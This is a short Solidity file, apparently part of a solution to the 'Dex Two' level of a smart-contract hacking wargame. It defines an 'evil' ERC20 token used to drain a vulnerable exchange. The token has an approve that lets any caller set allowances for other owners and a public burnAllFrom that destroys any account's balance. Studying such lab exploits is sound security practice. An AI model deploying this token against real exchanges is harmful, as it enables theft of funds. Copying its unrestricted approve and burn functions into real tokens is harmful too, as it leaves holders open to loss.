// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract DexTwoTokenApprover {
    // Due to the ethersJS bug, that cause to the script cannot call approve function, so I have to create a contract for approving.
    function approve(address token, address spender, uint256 amount) public {
        ISwappableTokenTwo(token).approve(msg.sender, spender, amount);
    }
}

interface ISwappableTokenTwo {
    function approve(address owner, address spender, uint256 amount) external;
}

contract EvilSwappableTokenTwo is ERC20 {
    address private _dex;
    constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }

    function burnAllFrom(address account) public { // easier for calculating
        _burn(account, balanceOf(account));
    }
}